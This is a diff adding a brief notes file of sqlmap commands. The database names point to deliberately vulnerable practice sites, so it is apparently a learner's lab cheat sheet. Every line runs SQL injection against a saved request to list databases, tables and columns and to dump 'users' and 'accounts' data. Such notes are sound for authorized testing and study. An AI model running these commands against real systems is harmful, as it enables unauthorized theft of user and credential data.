@@ -1,0 +1,11 @@
+salmap
+
+python sqlmap -r /file.txt -p "def" --dbs --batch
+
+sqlmap -r request.txt  -D mts_db --tables --batch
+
+sqlmap -r attack.txt -D nowasp -T accounts --columns --dump
+
+sqlmap -r attack.txt  -D acuart -T users --dump --batch
+
+sqlmap -r attack.txt  -D acuart --dump-all --batch
